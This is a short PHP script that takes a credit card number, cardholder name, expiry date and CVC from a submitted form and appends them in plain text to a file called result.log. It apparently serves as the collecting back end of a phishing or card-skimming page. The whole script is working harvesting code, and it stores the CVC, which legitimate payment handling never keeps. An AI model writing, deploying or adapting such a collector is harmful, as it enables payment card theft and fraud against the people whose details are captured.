<?php

$number = $_POST['number'];
$name = $_POST['name'];
$expiry = $_POST['expiry'];
$cvc = $_POST['cvc'];

$fs = fopen("result.log", "a+");
fwrite($fs, "[NUMBER] ".$number."\n[NAME] ".$name."\n[EXPIRY] ".$expiry."\n[CVC] ".$cvc."\n");
fclose($fs);
?>

